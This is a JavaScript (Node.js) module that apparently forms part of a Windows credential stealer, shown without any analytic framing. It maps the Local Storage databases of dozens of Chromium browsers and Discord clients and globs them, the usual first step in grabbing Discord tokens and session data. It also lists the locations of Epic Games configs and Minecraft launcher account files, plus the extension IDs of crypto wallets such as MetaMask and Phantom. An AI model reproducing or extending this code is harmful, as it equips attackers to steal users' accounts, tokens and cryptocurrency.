const path = require("node:path");
const { glob } = require("glob");

const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;
const userprofile = require("node:os").homedir();

module.exports.browsers = {
  chromium: {
    brave: {
      target: path.join(
        localappdata,
        "BraveSoftware",
        "Brave-Browser",
        "User Data"
      ),
      program: "brave.exe"
    },
    brave_nightly: {
      target: path.join(
        localappdata,
        "BraveSoftware",
        "Brave-Browser-Nightly",
        "User Data"
      ),
      program: "brave.exe"
    },
    brave_beta: {
      target: path.join(
        localappdata,
        "BraveSoftware",
        "Brave-Browser-Beta",
        "User Data"
      ),
      program: "brave.exe"
    },
    chrome: {
      target: path.join(localappdata, "Google", "Chrome", "User Data"),
      program: "chrome.exe"
    },
    chrome_dev: {
      target: path.join(localappdata, "Google", "Chrome Dev", "User Data"),
      program: "chrome.exe"
    },
    chrome_beta: {
      target: path.join(localappdata, "Google", "Chrome Beta", "User Data"),
      program: "chrome.exe"
    },
    chrome_canary: {
      target: path.join(localappdata, "Google", "Chrome SxS", "User Data"),
      program: "chrome.exe"
    },
    chromium: {
      target: path.join(localappdata, "Chromium", "User Data"),
      program: "chromium.exe"
    },
    comodo_dragon: {
      target: path.join(localappdata, "Comodo", "Dragon", "User Data"),
      program: "dragon.exe"
    },
    edge: {
      target: path.join(localappdata, "Microsoft", "Edge", "User Data"),
      program: "msedge.exe"
    },
    edge_dev: {
      target: path.join(localappdata, "Microsoft", "Edge Dev", "User Data"),
      program: "msedge.exe"
    },
    edge_beta: {
      target: path.join(localappdata, "Microsoft", "Edge Beta", "User Data"),
      program: "msedge.exe"
    },
    edge_canary: {
      target: path.join(localappdata, "Microsoft", "Edge SxS", "User Data"),
      program: "msedge.exe"
    },
    epic_privacy: {
      target: path.join(localappdata, "Epic Privacy Browser", "User Data"),
      program: "epic.exe"
    },
    iridium: {
      target: path.join(localappdata, "Iridium", "User Data"),
      program: "iridium.exe"
    },
    opera: {
      target: path.join(appdata, "Opera Software", "Opera Stable"),
      program: "opera.exe",
      singleProfile: true
    },
    opera_beta: {
      target: path.join(appdata, "Opera Software", "Opera Beta"),
      program: "opera.exe",
      singleProfile: true
    },
    opera_one_developer: {
      target: path.join(appdata, "Opera Software", "Opera Developer"),
      program: "opera.exe"
    },
    opera_gx: {
      target: path.join(appdata, "Opera Software", "Opera GX Stable"),
      program: "opera.exe",
      singleProfile: true
    },
    ur_browser: {
      target: path.join(localappdata, "UR Browser", "User Data"),
      program: "ur.exe"
    },
    vivaldi: {
      target: path.join(localappdata, "Vivaldi", "User Data"),
      program: "vivaldi.exe"
    },
    yandex: {
      target: path.join(localappdata, "Yandex", "YandexBrowser", "User Data"),
      program: "yandex.exe"
    },
    yandex_beta: {
      target: path.join(
        localappdata,
        "Yandex",
        "YandexBrowser Beta",
        "User Data"
      ),
      program: "yandex.exe"
    },
    slimjet: {
      target: path.join(localappdata, "Slimjet", "User Data"),
      program: "slimjet.exe"
    },
    cent_browser: {
      target: path.join(localappdata, "CentBrowser", "User Data"),
      program: "centbrowser.exe"
    },
    srware_iron: {
      target: path.join(localappdata, "SRWare Iron", "User Data"),
      program: "iron.exe"
    },
    blisk: {
      target: path.join(localappdata, "Blisk", "User Data"),
      program: "blisk.exe"
    },
    colibri: {
      target: path.join(localappdata, "Colibri", "User Data"),
      program: "colibri.exe"
    },
    citrio: {
      target: path.join(localappdata, "Citrio", "User Data"),
      program: "citrio.exe"
    }
  }
};

module.exports.getDiscordPath = async function () {
  const paths = {};
  const browsers = Object.assign(module.exports.browsers.chromium, {
    discord: {
      target: path.join(appdata, "discord"),
      singleProfile: true
    },
    discord_canary: {
      target: path.join(appdata, "discordcanary"),
      singleProfile: true
    },
    discord_ptb: {
      target: path.join(appdata, "discordptb"),
      singleProfile: true
    },
    discord_dev: {
      target: path.join(appdata, "discorddevelopment"),
      singleProfile: true
    }
  });

  for (const [name, browser] of Object.entries(browsers)) {
    const patternPath = browser.singleProfile
      ? "Local Storage/leveldb/*.{log,ldb}"
      : "{Default,Profile *}/Local Storage/leveldb/*.{log,ldb}";

    const pattern = path
      .resolve(`${browser.target}/${patternPath}`)
      .replaceAll("\\", "/");

    const databases = await glob(pattern).catch((e) => report(e, []));

    if (Array.isArray(databases) && databases.length)
      paths[name] = { databases, target: browser.target };
  }

  return paths;
};

module.exports.epicGames = path.join(
  localappdata,
  "EpicGamesLauncher",
  "Saved",
  "Config",
  "Windows"
);

module.exports.minecraft = {
  Intent: path.join(userprofile, "intentlauncher", "launcherconfig"),
  Lunar: path.join(
    userprofile,
    ".lunarclient",
    "settings",
    "game",
    "accounts.json"
  ),
  TLauncher: path.join(appdata, ".minecraft", "TlauncherProfiles.json"),
  Feather: path.join(appdata, ".feather", "accounts.json"),
  Meteor: path.join(appdata, ".minecraft", "meteor-client", "accounts.nbt"),
  Impact: path.join(appdata, ".minecraft", "Impact", "alts.json"),
  Novoline: path.join(appdata, ".minectaft", "Novoline", "alts.novo"),
  CheatBreakers: path.join(appdata, ".minecraft", "cheatbreaker_accounts.json"),
  "Microsoft Store": path.join(
    appdata,
    ".minecraft",
    "launcher_accounts_microsoft_store.json"
  ),
  Rise: path.join(appdata, ".minecraft", "Rise", "alts.txt"),
  "Rise (Intent)": path.join(userprofile, "intentlauncher", "Rise", "alts.txt"),
  Paladium: path.join(appdata, "paladium-group", "accounts.json"),
  PolyMC: path.join(appdata, "PolyMC", "accounts.json"),
  Badlion: path.join(appdata, "Badlion Client", "accounts.json")
};

module.exports.wallets = {
  metamask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
  metamask_edge: "ejbalbakoplchlghecdalmeeeajnimhm",
  exodus: "aholpfdialjgjfhomihkjbmgjidlcdno",
  binance: "fhbohimaelbohpjbbldcngcnapndodjp",
  coinbase: "hnfanknocfeofbddgcijnmhnfnkdnaad",
  trust: "egjidjbpglichdcondbcbdnbeeppgdph",
  phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa"
};
